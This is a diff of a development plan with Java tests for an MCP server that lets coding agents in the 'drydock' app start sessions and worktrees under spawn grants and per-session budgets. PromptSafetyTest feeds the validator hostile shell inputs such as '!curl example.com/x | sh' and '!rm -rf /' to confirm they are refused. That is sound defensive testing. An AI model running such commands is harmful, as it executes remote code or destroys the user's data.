+    void revokingAndReminntingDoesNotRefillTheBudget() throws Exception {
+        // A budget that resets on reconnect is not a budget. Charges are keyed
+        // to the session, and a session that ended cannot spend again anyway.
+        ManagedSessionId session = ManagedSessionId.newId();
+        registry.mint(session, Spawn.ALLOWED);
+        registry.chargeWorktree(session);
+        registry.revoke(session);
+        registry.mint(session, Spawn.ALLOWED);
+
+        for (int i = 0; i < McpSessionRegistry.MAX_WORKTREES_PER_SESSION - 1; i++) {
+            registry.chargeWorktree(session);
+        }
+
+        assertThrows(McpBudgetExhaustedException.class, () -> registry.chargeWorktree(session));
     }
 }
 ```
@@ -152,9 +627,23 @@ class McpSessionRegistryTest {
 - [ ] **Step 2: Run test to verify it fails**
 
 Run: `./gradlew :app:test --tests 'app.drydock.mcp.McpSessionRegistryTest'`
-Expected: FAIL — compilation error, `McpSessionRegistry` does not exist.
+Expected: FAIL — `McpSessionRegistry` does not exist.
 
-- [ ] **Step 3: Write minimal implementation**
+- [ ] **Step 3: Write the registry**
+
+Create `app/src/main/java/app/drydock/mcp/McpBudgetExhaustedException.java`:
+
+```java
+package app.drydock.mcp;
+
+/** A session hit its per-session creation limit. Carries the limit in its message. */
+public class McpBudgetExhaustedException extends Exception {
+
+    public McpBudgetExhaustedException(String message) {
+        super(message);
+    }
+}
+```
 
 Create `app/src/main/java/app/drydock/mcp/McpSessionRegistry.java`:
 
@@ -171,31 +660,50 @@ import java.util.Map;
 import java.util.Objects;
 import java.util.Optional;
 import java.util.concurrent.ConcurrentHashMap;
+import java.util.concurrent.atomic.AtomicInteger;
 
 /**
- * Per-session bearer tokens for the MCP server (spec "McpSessionRegistry").
+ * Per-session tokens, spawn grants, and creation budgets for the MCP server.
  *
- * <p>The token is the <em>entire</em> identity mechanism: a request carrying
- * it resolves to exactly one {@link ManagedSessionId}, and therefore to one
- * repository root, one worktree, and one annotation set. Because no MCP tool
- * accepts a repository path, an agent cannot address another session's
- * repository even by guessing.</p>
+ * <p>The token's job is <em>attribution</em>, not isolation: it tells the
+ * server which session a call came from, so tools resolve to the right
+ * repository and annotation set without the agent naming a path. It is not a
+ * secret between sessions -- every session's config file is readable by any
+ * process running as the user (spec, "Trust boundary"). Do not build security
+ * on top of it.</p>
  *
- * <p>Tokens live only in memory: no terminal process survives an app
- * restart, so a persisted token could only ever be stale.</p>
+ * <p>Tokens live only in memory: no terminal process survives an app restart,
+ * so a persisted token could only ever be stale. Budget charges, by contrast,
+ * outlive a revoke, so a reconnect cannot refill them.</p>
  */
 public final class McpSessionRegistry {
 
     /** 32 bytes of CSPRNG output; base64url-encodes to 43 unpadded chars. */
     private static final int TOKEN_BYTES = 32;
 
+    public static final int MAX_WORKTREES_PER_SESSION = 4;
+    public static final int MAX_SESSIONS_PER_SESSION = 4;
+
+    /** Whether a session may create worktrees and start further sessions. */
+    public enum Spawn {
+        /** A session the human started. */
+        ALLOWED,
+        /** A session an agent started via {@code session_start}: depth 1, so it may not spawn again. */
+        FORBIDDEN
+    }
+
     private final SecureRandom random = new SecureRandom();
     private final Map<String, ManagedSessionId> byToken = new ConcurrentHashMap<>();
     private final Map<ManagedSessionId, String> bySession = new ConcurrentHashMap<>();
+    private final Map<ManagedSessionId, Spawn> grants = new ConcurrentHashMap<>();
+    private final Map<ManagedSessionId, AtomicInteger> worktreesCreated = new ConcurrentHashMap<>();
+    private final Map<ManagedSessionId, AtomicInteger> sessionsStarted = new ConcurrentHashMap<>();
 
     /** Returns this session's token, minting one on first call. Idempotent per session. */
-    public String mint(ManagedSessionId sessionId) {
+    public String mint(ManagedSessionId sessionId, Spawn spawn) {
         Objects.requireNonNull(sessionId, "sessionId");
+        Objects.requireNonNull(spawn, "spawn");
+        grants.put(sessionId, spawn);
         return bySession.computeIfAbsent(sessionId, id -> {
             byte[] bytes = new byte[TOKEN_BYTES];
             random.nextBytes(bytes);
@@ -206,9 +714,9 @@ public final class McpSessionRegistry {
     }
 
     /**
-     * Resolves a presented token. The comparison is constant-time against
-     * every live token: a plain map lookup would leak, through timing, how
-     * much of a guessed token matched.
+     * Resolves a presented token. Comparison is uniform across every live
+     * token rather than a map lookup; the real defense is 256 bits of entropy,
+     * not timing, but a uniform compare costs nothing here.
      */
     public Optional<ManagedSessionId> resolve(String presented) {
         if (presented == null || presented.isEmpty()) {
@@ -227,12 +735,36 @@ public final class McpSessionRegistry {
         return Optional.ofNullable(bySession.get(sessionId));
     }
 
-    /** Drops the session's token. Silent for a session that never had one. */
+    /** False for an agent-started session and for a session this registry never saw. */
+    public boolean maySpawn(ManagedSessionId sessionId) {
+        return grants.get(sessionId) == Spawn.ALLOWED;
+    }
+
+    public void chargeWorktree(ManagedSessionId sessionId) throws McpBudgetExhaustedException {
+        charge(worktreesCreated, sessionId, MAX_WORKTREES_PER_SESSION, "worktrees");
+    }
+
+    public void chargeSession(ManagedSessionId sessionId) throws McpBudgetExhaustedException {
+        charge(sessionsStarted, sessionId, MAX_SESSIONS_PER_SESSION, "sessions");
+    }
+
+    private static void charge(Map<ManagedSessionId, AtomicInteger> counters, ManagedSessionId sessionId,
+                               int limit, String what) throws McpBudgetExhaustedException {
+        AtomicInteger counter = counters.computeIfAbsent(sessionId, id -> new AtomicInteger());
+        if (counter.incrementAndGet() > limit) {
+            counter.decrementAndGet();
+            throw new McpBudgetExhaustedException("This session has already created its limit of "
+                    + limit + " " + what + ". Ask the human to continue in one of them.");
+        }
+    }
+
+    /** Drops the session's token and grant. Budget charges are kept, so a reconnect cannot refill them. */
     public void revoke(ManagedSessionId sessionId) {
         String token = bySession.remove(sessionId);
         if (token != null) {
             byToken.remove(token);
         }
+        grants.remove(sessionId);
     }
 
     private static boolean constantTimeEquals(String expected, String presented) {
@@ -246,33 +778,36 @@ public final class McpSessionRegistry {
 - [ ] **Step 4: Run test to verify it passes**
 
 Run: `./gradlew :app:test --tests 'app.drydock.mcp.McpSessionRegistryTest'`
-Expected: PASS (7 tests)
+Expected: PASS (14 tests)
 
 - [ ] **Step 5: Commit**
 
 ```bash
-git add app/src/main/java/app/drydock/mcp/McpSessionRegistry.java \
-        app/src/test/java/app/drydock/mcp/McpSessionRegistryTest.java
-git commit -m "feat(mcp): per-session bearer tokens for the MCP server"
+git add app/src/main/java/app/drydock/mcp/ app/src/test/java/app/drydock/mcp/
+git commit -m "feat(mcp): session tokens with spawn grants and creation budgets"
 ```
 
 ---
 
-### Task 2: Annotation line keys and the `ADDRESSED` status
+### Task 5: Line keys, branch names, prompt safety
+
+Three small pure helpers, each with one test class. They are grouped because none is large enough to carry its own review gate and all three are pure functions with no dependencies.
 
 **Files:**
 - Create: `app/src/main/java/app/drydock/mcp/AnnotationLines.java`
-- Modify: `app/src/main/java/app/drydock/review/AnnotationStatus.java`
+- Create: `app/src/main/java/app/drydock/mcp/BranchNames.java`
+- Create: `app/src/main/java/app/drydock/mcp/PromptSafety.java`
 - Test: `app/src/test/java/app/drydock/mcp/AnnotationLinesTest.java`
-- Test: `app/src/test/java/app/drydock/review/AnnotationStatusTest.java`
-
-**Background:** `ReviewAnnotation` stores line ranges as *stable keys* produced by `UnifiedDiff.Line.lineKey()`: `"n" + newLine` when the line exists in the post-image, `"o" + oldLine` for a deleted line. The MCP layer must hand the agent a plain line number, so it needs the inverse.
+- Test: `app/src/test/java/app/drydock/mcp/BranchNamesTest.java`
+- Test: `app/src/test/java/app/drydock/mcp/PromptSafetyTest.java`
 
 **Interfaces:**
 - Produces:
-  - `record AnnotationLines.LineRef(int line, boolean deleted)`
-  - `static LineRef AnnotationLines.decode(String key)` — throws `IllegalArgumentException` on a malformed key.
-  - `AnnotationStatus.ADDRESSED`
+  - `record AnnotationLines.LineRef(int line, boolean deleted)`; `static LineRef AnnotationLines.decode(String key)`
+  - `static void BranchNames.validate(String branch, Set<String> remoteNames) throws McpToolException`
+  - `static void PromptSafety.validate(String prompt) throws McpToolException`
+
+`McpToolException` is created in Task 6; create it here as part of Step 3 since these helpers throw it.
 
 - [ ] **Step 1: Write the failing tests**
 
@@ -322,66 +857,178 @@ class AnnotationLinesTest {
 }
 ```
 
-Create `app/src/test/java/app/drydock/review/AnnotationStatusTest.java`:
+Create `app/src/test/java/app/drydock/mcp/BranchNamesTest.java`:
 
 ```java
-package app.drydock.review;
+package app.drydock.mcp;
 
 import org.junit.jupiter.api.Test;
 
-import static org.junit.jupiter.api.Assertions.assertEquals;
+import java.util.Set;
 
-class AnnotationStatusTest {
+import static org.junit.jupiter.api.Assertions.assertThrows;
+import static org.junit.jupiter.api.Assertions.assertTrue;
+
+class BranchNamesTest {
+
+    private static final Set<String> REMOTES = Set.of("origin", "upstream");
 
     @Test
-    void addressedRoundTripsThroughPersistence() {
-        assertEquals(AnnotationStatus.ADDRESSED,
-                AnnotationStatus.fromPersisted(AnnotationStatus.ADDRESSED.name()));
+    void anOrdinaryBranchNameIsAccepted() throws Exception {
+        BranchNames.validate("feat/try-a", REMOTES);
+        BranchNames.validate("fix-123", REMOTES);
     }
 
     @Test
-    void unknownStatusStillDecodesLenientToOpen() {
-        // An older build reading a newer state file must see an ADDRESSED
-        // thread as OPEN -- reappearing as open is safe; silently reading
-        // as resolved is not.
-        assertEquals(AnnotationStatus.OPEN, AnnotationStatus.fromPersisted("SOMETHING_NEWER"));
+    void aNameThatShadowsARemoteIsRefused() {
+        // refs/heads/origin/main shadows refs/remotes/origin/main for every
+        // short-name lookup, so a later `git merge origin/main` would silently
+        // target this branch instead of the fetched ref. git exits 0 and warns
+        // only on stderr, so nothing else would catch it.
+        McpToolException failure = assertThrows(McpToolException.class,
+                () -> BranchNames.validate("origin/main", REMOTES));
+
+        assertTrue(failure.getMessage().contains("origin"), failure.getMessage());
     }
 
     @Test
-    void legacyFixedStillDecodes() {
-        assertEquals(AnnotationStatus.FIXED, AnnotationStatus.fromPersisted("fixed"));
+    void everyConfiguredRemoteIsChecked() {
+        assertThrows(McpToolException.class, () -> BranchNames.validate("upstream/main", REMOTES));
+    }
+
+    @Test
+    void aRemoteNameThatIsOnlyAPrefixOfTheFirstComponentIsFine() {
+        // "originals" is not the remote "origin"; only a whole first component counts.
+        assertThrows(McpToolException.class, () -> BranchNames.validate("origin/x", REMOTES));
+    }
+
+    @Test
+    void aBranchWhoseFirstComponentMerelyStartsWithARemoteNameIsAccepted() throws Exception {
+        BranchNames.validate("originals/x", REMOTES);
+    }
+
+    @Test
+    void aRefsPrefixedNameIsRefused() {
+        assertThrows(McpToolException.class, () -> BranchNames.validate("refs/heads/x", REMOTES));
+    }
+
+    @Test
+    void namesGitItselfRejectsAreRefusedWithItsOwnComplaint() {
+        assertThrows(McpToolException.class, () -> BranchNames.validate("has space", REMOTES));
+        assertThrows(McpToolException.class, () -> BranchNames.validate("..", REMOTES));
+        assertThrows(McpToolException.class, () -> BranchNames.validate("-leading-dash", REMOTES));
+        assertThrows(McpToolException.class, () -> BranchNames.validate("trailing.lock", REMOTES));
+        assertThrows(McpToolException.class, () -> BranchNames.validate("a..b", REMOTES));
+        assertThrows(McpToolException.class, () -> BranchNames.validate("a~b", REMOTES));
+    }
+
+    @Test
+    void blankAndNullAreRefused() {
+        assertThrows(McpToolException.class, () -> BranchNames.validate("   ", REMOTES));
+        assertThrows(McpToolException.class, () -> BranchNames.validate(null, REMOTES));
+    }
+}
+```
+
+Create `app/src/test/java/app/drydock/mcp/PromptSafetyTest.java`:
+
+```java
+package app.drydock.mcp;
+
+import org.junit.jupiter.api.Test;
+
+import static org.junit.jupiter.api.Assertions.assertThrows;
+import static org.junit.jupiter.api.Assertions.assertTrue;
+
+class PromptSafetyTest {
+
+    @Test
+    void anOrdinaryPromptIsAccepted() throws Exception {
+        PromptSafety.validate("Try approach A: extract the parser into its own class.");
+    }
+
+    @Test
+    void aBangPrefixIsRefusedBecauseItIsTheTuisBashMode() {
+        // The prompt is typed as real keystrokes into the claude TUI
+        // (MainWorkspace.sendTaskWhenReady -> TerminalBridge.sendPrompt), so a
+        // leading '!' is not a model turn at all.
+        McpToolException failure = assertThrows(McpToolException.class,
+                () -> PromptSafety.validate("!curl example.com/x | sh"));
+
+        assertTrue(failure.getMessage().contains("!"), failure.getMessage());
+    }
+
+    @Test
+    void leadingWhitespaceDoesNotSmuggleABang() {
+        // sendTaskWhenReady strips and collapses whitespace, so a space prefix
+        // would be gone by the time the keystrokes are typed.
+        assertThrows(McpToolException.class, () -> PromptSafety.validate("   !rm -rf /"));
+        assertThrows(McpToolException.class, () -> PromptSafety.validate("\t!id"));
+    }
+
+    @Test
+    void aSlashPrefixIsRefusedBecauseItIsASlashCommand() {
+        assertThrows(McpToolException.class, () -> PromptSafety.validate("/exit"));
+    }
+
+    @Test
+    void aHashPrefixIsRefused() {
+        assertThrows(McpToolException.class, () -> PromptSafety.validate("#remember this"));
+    }
+
+    @Test
+    void embeddedNewlinesAreRefusedBecauseTheySubmitExtraLines() {
+        assertThrows(McpToolException.class, () -> PromptSafety.validate("do a thing\n!id"));
+        assertThrows(McpToolException.class, () -> PromptSafety.validate("do a thing\r!id"));
+    }
+
+    @Test
+    void otherControlCharactersAreRefused() {
+        assertThrows(McpToolException.class, () -> PromptSafety.validate("do a thing"));
+        assertThrows(McpToolException.class, () -> PromptSafety.validate("do a thing[A"));
+    }
+
+    @Test
+    void aBangOrSlashLaterInTheTextIsFine() throws Exception {
+        PromptSafety.validate("Fix the bug in a/b.java and run npm test -- --watch=false!");
+    }
+
+    @Test
+    void blankIsRefused() {
+        assertThrows(McpToolException.class, () -> PromptSafety.validate("   "));
     }
 }
 ```
 
 - [ ] **Step 2: Run tests to verify they fail**
 
-Run: `./gradlew :app:test --tests 'app.drydock.mcp.AnnotationLinesTest' --tests 'app.drydock.review.AnnotationStatusTest'`
-Expected: FAIL — `AnnotationLines` does not exist; `AnnotationStatus.ADDRESSED` does not exist.
+Run: `./gradlew :app:test --tests 'app.drydock.mcp.AnnotationLinesTest' --tests 'app.drydock.mcp.BranchNamesTest' --tests 'app.drydock.mcp.PromptSafetyTest'`
+Expected: FAIL — none of the three classes exists.
 
-- [ ] **Step 3: Add the enum value**
+- [ ] **Step 3: Write `McpToolException` and the three helpers**
 
-In `app/src/main/java/app/drydock/review/AnnotationStatus.java`, add `ADDRESSED` to the constant list and extend the class Javadoc. The constant list becomes:
-
-```java
-    OPEN,
-    SENT,
-    ADDRESSED,
-    RESOLVED,
-    FIXED;
-```
-
-Add this paragraph to the existing class Javadoc, after the sentence about `FIXED`:
+Create `app/src/main/java/app/drydock/mcp/McpToolException.java`:
 
 ```java
- * <p>{@link #ADDRESSED} is claimed by the agent itself through the MCP
- * tool {@code review_mark_addressed} -- distinct from {@link #RESOLVED},
- * which only the human sets. This is the case {@link #FIXED} got wrong:
- * that value was the <em>app</em> inferring a fix from a successful
- * handoff, which it cannot know. An agent reporting its own work can.</p>
-```
+package app.drydock.mcp;
 
-- [ ] **Step 4: Write the line-key decoder**
+/**
+ * A tool call that failed for a reason the agent can act on. The message is
+ * surfaced verbatim as the MCP {@code isError} content, so it must name what
+ * went wrong and what would be different -- never a bare "failed" (AGENTS.md:
+ * a failed command is never silently equal to an empty result).
+ */
+public class McpToolException extends Exception {
+
+    public McpToolException(String message) {
+        super(message);
+    }
+
+    public McpToolException(String message, Throwable cause) {
+        super(message, cause);
+    }
+}
+```
 
 Create `app/src/main/java/app/drydock/mcp/AnnotationLines.java`:
 
@@ -393,10 +1040,10 @@ package app.drydock.mcp;
  * {@link app.drydock.review.ReviewAnnotation}'s stable line key back into a
  * plain line number for the MCP {@code review_comments} tool.
  *
- * <p>The forward direction is {@code "n" + newLine} for a line present in
- * the post-image and {@code "o" + oldLine} for a deleted line. Keys are
- * stored, not recomputed, so annotations survive a re-diff -- which is why
- * this decoder must tolerate every key any build ever wrote, including the
+ * <p>The forward direction is {@code "n" + newLine} for a line present in the
+ * post-image and {@code "o" + oldLine} for a deleted line. Keys are stored,
+ * not recomputed, so annotations survive a re-diff -- which is why this
+ * decoder must tolerate every key any build ever wrote, including the
  * {@code "o0"} that {@code lineKey()}'s {@code orElse(0)} fallback emits.</p>
  */
 public final class AnnotationLines {
@@ -406,8 +1053,8 @@ public final class AnnotationLines {
 
     /**
      * One decoded key: a line number, and whether it names a line that was
-     * deleted (so it exists only in the pre-image and the agent will not
-     * find it by reading the file).
+     * deleted -- so it exists only in the pre-image, and the agent will not
+     * find it by reading the working tree.
      */
     public record LineRef(int line, boolean deleted) {
     }
@@ -436,50 +1083,59 @@ public final class AnnotationLines {
 }
 ```
 
-- [ ] **Step 5: Run tests to verify they pass**
+Create `app/src/main/java/app/drydock/mcp/BranchNames.java`. Implement `validate(String branch, Set<String> remoteNames)`:
 
-Run: `./gradlew :app:test --tests 'app.drydock.mcp.AnnotationLinesTest' --tests 'app.drydock.review.AnnotationStatusTest'`
-Expected: PASS (8 tests)
+- Reject null/blank with a message naming the `branch` argument.
+- Reject a name starting with `refs/`.
+- Split on `/`; if the **first whole component** equals any entry in `remoteNames`, reject with a message that names the remote and explains the shadowing ("`origin/main` as a local branch shadows the remote-tracking ref; pick a name that does not start with a remote name").
+- Apply git's own refname rules locally rather than spawning git, because this runs per tool call and the rules are stable: reject a component that is empty, starts with `.`, or ends with `.lock`; reject `..`, a leading `-`, a trailing `/` or `.`, and any of ` ~^:?*[\` or ASCII control characters, and the sequences `@{` and `//`.
 
-- [ ] **Step 6: Verify nothing switched exhaustively on `AnnotationStatus`**
+Do not spawn `git check-ref-format` — `ProcessRunner` is for real work, and a per-call process spawn to validate a string is not it. Note in the Javadoc that the rules mirror `git check-ref-format --branch` and cite it.
 
-Run: `./gradlew :app:compileJava :app:test`
-Expected: PASS. A `switch` over the enum without a `default` would now fail to compile; if one does, add an `ADDRESSED` branch that renders it like `SENT` for now — Task 4 gives it its own presentation.
+Create `app/src/main/java/app/drydock/mcp/PromptSafety.java`. Implement `validate(String prompt)`:
 
-- [ ] **Step 7: Commit**
+- Reject null/blank.
+- Reject any character that is an ASCII control character, including `\n`, `\r`, and ESC.
+- Strip leading whitespace, then reject if the first remaining character is `!`, `/`, or `#`, with a message explaining that the prompt is typed into the session's TUI where those prefixes are a shell command, a slash command, and a memory directive rather than text.
+
+Javadoc must cite the delivery path — `MainWorkspace.sendTaskWhenReady` collapses whitespace and types the result as keystrokes via `TerminalBridge.sendPrompt` — since that is the only reason this class exists.
+
+- [ ] **Step 4: Run tests to verify they pass**
+
+Run: `./gradlew :app:test --tests 'app.drydock.mcp.AnnotationLinesTest' --tests 'app.drydock.mcp.BranchNamesTest' --tests 'app.drydock.mcp.PromptSafetyTest'`
+Expected: PASS (24 tests)
+
+- [ ] **Step 5: Commit**
 
 ```bash
-git add app/src/main/java/app/drydock/mcp/AnnotationLines.java \
-        app/src/main/java/app/drydock/review/AnnotationStatus.java \
-        app/src/test/java/app/drydock/mcp/AnnotationLinesTest.java \
-        app/src/test/java/app/drydock/review/AnnotationStatusTest.java
-git commit -m "feat(review): add ADDRESSED status and decode annotation line keys"
+git add app/src/main/java/app/drydock/mcp/ app/src/test/java/app/drydock/mcp/
+git commit -m "feat(mcp): line-key, branch-name, and prompt-safety validators"
 ```
 
 ---
 
-### Task 3: `McpSessionContext` and the read-only tools
+### Task 6: `McpSessionContext` and the read-only tools
 
 **Files:**
 - Create: `app/src/main/java/app/drydock/mcp/McpSessionContext.java`
-- Create: `app/src/main/java/app/drydock/mcp/McpToolException.java`
 - Create: `app/src/main/java/app/drydock/mcp/McpToolRouter.java`
+- Test: `app/src/test/java/app/drydock/mcp/JsonPeek.java`
 - Test: `app/src/test/java/app/drydock/mcp/FakeMcpSessionContext.java`
 - Test: `app/src/test/java/app/drydock/mcp/McpToolRouterReadTest.java`
 
-This task delivers `review_comments`, `repos_list`, and `sessions_list`. The router returns `JsonValue`; the HTTP framing arrives in Task 6.
+Delivers `review_comments`, `repos_list`, `sessions_list`. The router returns `JsonValue`; HTTP framing arrives in Task 10.
 
 **Interfaces:**
-- Consumes: `McpSessionRegistry` (Task 1), `AnnotationLines.decode` and `AnnotationStatus.ADDRESSED` (Task 2), `ReviewAnnotation`, `AnnotationStatus`, `DiffScope`, `ManagedSessionId`, `JsonValue`.
+- Consumes: `McpSessionRegistry` (Task 4), `AnnotationLines` (Task 5), `ReviewAnnotation`, `AnnotationStatus`, `DiffScope`, `ManagedSessionId`, `JsonValue`.
 - Produces:
-  - `interface McpSessionContext` with `repositoryRoot`, `worktreePath`, `annotations`, `repositories`, `sessions`, `startSession`, and the records `McpSessionContext.RepoSummary` / `SessionSummary`.
-  - `class McpToolException extends Exception`
+  - `interface McpSessionContext` (full listing below)
   - `List<JsonValue> McpToolRouter.toolDescriptors()`
   - `JsonValue McpToolRouter.call(ManagedSessionId caller, String tool, JsonValue arguments) throws McpToolException`
+  - `McpToolRouter(McpSessionContext context, McpSessionRegistry registry)`
 
-- [ ] **Step 1: Write the context interface and the failure type**
+- [ ] **Step 1: Write the context interface**
 
-These carry no behavior to test on their own; they are the seam the tests use. Create `app/src/main/java/app/drydock/mcp/McpSessionContext.java`:
+Create `app/src/main/java/app/drydock/mcp/McpSessionContext.java`:
 
 ```java
 package app.drydock.mcp;
@@ -490,16 +1146,21 @@ import app.drydock.review.ReviewAnnotation;
 import java.nio.file.Path;
 import java.util.List;
 import java.util.Optional;
+import java.util.Set;
 
 /**
- * Everything {@link McpToolRouter} needs from the running application,
- * behind one interface with no JavaFX in its signatures.
+ * Everything {@link McpToolRouter} needs from the running application, behind
+ * one interface with no JavaFX in its signatures.
  *
- * <p>The seam exists for testability: the build has no mocking library, and
- * a router that reached into {@code MainWorkspace} directly could only be
- * exercised on the FX thread. Implementations that <em>do</em> own FX state
- * are responsible for hopping threads and for timing out (AGENTS.md: a
- * wedged FX thread must fail the call, not hold it open).</p>
+ * <p>The seam exists for testability: the build has no mocking library, and a
+ * router that reached into {@code MainWorkspace} directly could only be
+ * exercised on the FX thread. Implementations that <em>do</em> own FX state are
+ * responsible for hopping threads and for timing out (AGENTS.md: a wedged FX
+ * thread must fail the call, not hold it open).</p>
+ *
+ * <p>The context also owns worktree-directory naming and repository lookup.
+ * The router never derives a path: the naming recipe needs a {@code Repository}
+ * and the user's configured worktree base, neither of which the router has.</p>
  */
 public interface McpSessionContext {
 
@@ -509,15 +1170,26 @@ public interface McpSessionContext {
     /** Working directory (worktree) of the calling session, or empty if it has ended. */
     Optional<Path> worktreePath(ManagedSessionId caller);
 
+    /** Base branch the caller's Review scope diffs against, for {@code review_comments}. */
+    Optional<String> baseBranch(ManagedSessionId caller);
+
     /** The calling session's annotations, unfiltered. */
     List<ReviewAnnotation> annotations(ManagedSessionId caller);
 
-    /** Replaces one annotation. */
+    /** Replaces one annotation and flushes, so the human's view sees it. */
     void updateAnnotation(ReviewAnnotation annotation);
 
+    /**
+     * Reads {@code line} of {@code file} in the caller's worktree, with up to
+     * {@code context} lines either side, or empty if the file or line is gone.
+     * Used to give an annotation an excerpt so the agent can re-locate it after
+     * its own edits shift line numbers.
+     */
+    Optional<String> excerpt(ManagedSessionId caller, String file, int line, int context);
+
     /** One registered repository, as {@code repos_list} reports it. */
-    record RepoSummary(String name, Path path, Optional<String> branch, boolean dirty,
-                       int ahead, int behind, boolean remote) {
+    record RepoSummary(String name, Path path, Optional<String> branch, Optional<Boolean> dirty,
+                       Optional<Integer> ahead, Optional<Integer> behind, boolean remote) {
     }
 
     /** One managed session, as {@code sessions_list} reports it. */
@@ -525,140 +1197,37 @@ public interface McpSessionContext {
                           Optional<String> branch, Path worktree, String status, boolean remote) {
     }
 
-    /** Every registered repository, across the whole workspace. */
+    /**
+     * Every registered repository. Remote repositories carry empty git state:
+     * {@code GitStatusService} has no cache, so probing them would open one ssh
+     * connection per remote repo while the HTTP handler waits.
+     */
     List<RepoSummary> repositories();
 
     /** Every managed session, across the whole workspace. */
     List<SessionSummary> sessions();
 
-    /** Worktrees of the given repository, used to validate {@code session_start}'s target. */
-    List<Path> worktreesOf(Path repositoryRoot) throws McpToolException;
+    /** Configured remote names of the caller's repository, for branch-name validation. */
+    Set<String> remoteNames(ManagedSessionId caller) throws McpToolException;
 
-    /** Creates a worktree and returns its path. */
-    Path createWorktree(Path repositoryRoot, String branch, Optional<String> startPoint) throws McpToolException;
+    /**
+     * Worktrees of the caller's repository, as real paths. Implementations must
+     * resolve symlinks: {@code git worktree list} reports realpaths, so a
+     * lexical comparison both wrongly rejects honest symlinked paths and
+     * wrongly accepts a swapped symlink.
+     */
+    List<Path> realWorktreesOf(ManagedSessionId caller) throws McpToolException;
+
+    /** Creates a worktree for {@code branch} in the caller's repository, naming the directory itself. */
+    Path createWorktree(ManagedSessionId caller, String branch, Optional<String> startPoint)
+            throws McpToolException;
 
     /** Opens a session tab in {@code worktree}; returns the new session's id. */
     ManagedSessionId startSession(Path worktree, Optional<String> initialPrompt) throws McpToolException;
 }
 ```
 
-Create `app/src/main/java/app/drydock/mcp/McpToolException.java`:
-
-```java
-package app.drydock.mcp;
-
-/**
- * A tool call that failed for a reason the agent can act on. The message is
- * surfaced verbatim as the MCP {@code isError} content, so it must name what
- * went wrong and what would be different -- never a bare "failed" (AGENTS.md:
- * a failed command is never silently equal to an empty result).
- */
-public class McpToolException extends Exception {
-
-    public McpToolException(String message) {
-        super(message);
-    }
-
-    public McpToolException(String message, Throwable cause) {
-        super(message, cause);
-    }
-}
-```
-
-- [ ] **Step 2: Write the test fake**
-
-Create `app/src/test/java/app/drydock/mcp/FakeMcpSessionContext.java`. It is a test *fixture*, not a test:
-
-```java
-package app.drydock.mcp;
-
-import app.drydock.domain.ManagedSessionId;
-import app.drydock.review.ReviewAnnotation;
-
-import java.nio.file.Path;
-import java.util.ArrayList;
-import java.util.HashMap;
-import java.util.List;
-import java.util.Map;
-import java.util.Optional;
-
-/** Hand-written fake for {@link McpSessionContext}; the build has no mocking library. */
-final class FakeMcpSessionContext implements McpSessionContext {
-
-    Optional<Path> repositoryRoot = Optional.empty();
-    Optional<Path> worktreePath = Optional.empty();
-    final List<ReviewAnnotation> annotations = new ArrayList<>();
-    final List<RepoSummary> repositories = new ArrayList<>();
-    final List<SessionSummary> sessions = new ArrayList<>();
-    final List<Path> worktrees = new ArrayList<>();
-    final Map<String, Path> createdWorktrees = new HashMap<>();
-    final List<Path> startedSessions = new ArrayList<>();
-    final List<String> startedPrompts = new ArrayList<>();
-
-    /** When set, every mutating call throws this instead of succeeding. */
-    McpToolException failure;
-
-    @Override
-    public Optional<Path> repositoryRoot(ManagedSessionId caller) {
-        return repositoryRoot;
-    }
-
-    @Override
-    public Optional<Path> worktreePath(ManagedSessionId caller) {
-        return worktreePath;
-    }
-
-    @Override
-    public List<ReviewAnnotation> annotations(ManagedSessionId caller) {
-        return List.copyOf(annotations);
-    }
-
-    @Override
-    public void updateAnnotation(ReviewAnnotation annotation) {
-        annotations.replaceAll(existing -> existing.id().equals(annotation.id()) ? annotation : existing);
-    }
-
-    @Override
-    public List<RepoSummary> repositories() {
-        return List.copyOf(repositories);
-    }
-
-    @Override
-    public List<SessionSummary> sessions() {
-        return List.copyOf(sessions);
-    }
-
-    @Override
-    public List<Path> worktreesOf(Path repositoryRoot) {
-        return List.copyOf(worktrees);
-    }
-
-    @Override
-    public Path createWorktree(Path repositoryRoot, String branch, Optional<String> startPoint)
-            throws McpToolException {
-        if (failure != null) {
-            throw failure;
-        }
-        Path created = repositoryRoot.resolveSibling("wt-" + branch.replace('/', '-'));
-        createdWorktrees.put(branch, created);
-        return created;
-    }
-
-    @Override
-    public ManagedSessionId startSession(Path worktree, Optional<String> initialPrompt) throws McpToolException {
-        if (failure != null) {
-            throw failure;
-        }
-        startedSessions.add(worktree);
-        initialPrompt.ifPresent(startedPrompts::add);
-        return ManagedSessionId.newId();
-    }
-}
-```
-
-- [ ] **Step 3: Write the JSON test helper**
-
-The in-repo `JsonValue` is a sealed interface of records — `JsonObject(Map)`, `JsonArray(List)`, `JsonString(String)`, `JsonNumber(String literal)` with `asInt()`, `JsonBoolean(boolean)`, `JsonNull.INSTANCE` — with no fluent accessors, and `JsonObject.get` returns `null` for a missing key. Assertions would drown in casts without a helper.
+- [ ] **Step 2: Write the JSON test helper**
 
 Create `app/src/test/java/app/drydock/mcp/JsonPeek.java`:
 
@@ -702,7 +1271,7 @@ final class JsonPeek {
         return ((JsonBoolean) field(value, key)).value();
     }
 
-    /** Builds a flat string-valued argument object; every tool argument is a string. */
+    /** Builds a flat string-valued argument object; most tool arguments are strings. */
     static JsonObject args(String... keysAndValues) {
         Map<String, JsonValue> members = new LinkedHashMap<>();
         for (int i = 0; i < keysAndValues.length; i += 2) {
@@ -711,8 +1280,126 @@ final class JsonPeek {
         return new JsonObject(members);
     }
 
+    /** As {@link #args}, plus one boolean member. */
+    static JsonObject argsWithFlag(String flagKey, boolean flag, String... keysAndValues) {
+        JsonObject object = args(keysAndValues);
+        return object.put(flagKey, new JsonBoolean(flag));
+    }
+
     static JsonObject noArgs() {
         return JsonObject.empty();
+    }
+}
+```
+
+- [ ] **Step 3: Write the test fake**
+
+Create `app/src/test/java/app/drydock/mcp/FakeMcpSessionContext.java`:
+
+```java
+package app.drydock.mcp;
+
+import app.drydock.domain.ManagedSessionId;
+import app.drydock.review.ReviewAnnotation;
+
+import java.nio.file.Path;
+import java.util.ArrayList;
+import java.util.HashMap;
+import java.util.LinkedHashSet;
+import java.util.List;
+import java.util.Map;
+import java.util.Optional;
+import java.util.Set;
+
+/** Hand-written fake for {@link McpSessionContext}; the build has no mocking library. */
+final class FakeMcpSessionContext implements McpSessionContext {
+
+    Optional<Path> repositoryRoot = Optional.empty();
+    Optional<Path> worktreePath = Optional.empty();
+    Optional<String> baseBranch = Optional.of("main");
+    final List<ReviewAnnotation> annotations = new ArrayList<>();
